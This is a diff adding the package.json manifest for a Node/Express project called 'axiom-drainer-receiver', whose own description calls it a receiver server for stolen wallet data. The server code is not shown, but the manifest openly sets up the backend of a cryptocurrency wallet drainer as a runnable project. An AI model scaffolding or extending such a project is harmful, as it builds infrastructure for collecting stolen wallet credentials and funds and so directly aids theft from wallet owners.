@@ -1,0 +1,13 @@
+{
+  "name": "axiom-drainer-receiver",
+  "version": "1.0.0",
+  "description": "Receiver server for stolen wallet data",
+  "main": "server.js",
+  "type": "module",
+  "scripts": {
+    "start": "node server.js"
+  },
+  "dependencies": {
+    "express": "^4.21.0"
+  }
+}
